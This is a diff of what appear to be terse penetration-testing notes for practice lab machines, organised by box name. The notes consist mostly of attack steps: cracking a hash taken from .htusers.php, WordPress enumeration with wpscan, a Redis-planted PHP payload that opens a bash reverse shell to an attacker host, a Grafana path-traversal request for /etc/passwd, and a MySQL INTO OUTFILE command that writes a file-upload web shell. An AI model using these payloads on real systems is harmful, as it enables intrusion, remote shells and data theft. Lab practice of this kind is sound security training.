@@ -1,4 +1,15 @@
 
+#### Extplorer => Filemanager 
+1. Get dora pw from .htusers.php then `hashcat -m 3200` 
+
+#### Readys => WP site editor 
+1. Run `wpscan --url http://{{TARGET_IP}} --api-token {{TOKEN}} --enumerate vp` 
+2. Exploit = https://www.exploit-db.com/exploits/44340 on /etc/redis/redis.conf 
+3. In redis-cli `set test '<?php system("echo \"bash -i >& /dev/tcp/{{LHOST}}/4444 0>&1\" | bash"); ?>'` 
+
+---- 
+
+
 #### Fanastic => Grafana 
 ```
 curl http://{{URL}}/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
@@ -8,6 +19,7 @@ https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798
 
 #### Squid => squid proxy, but mysql rev shell 
 ` SELECT "<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>" INTO OUTFILE 'C:/wamp/www/uploader.php'; ` 
+
 
 Also check for /webdav , /zm , /login 
 Use curl -v to check header & version. 
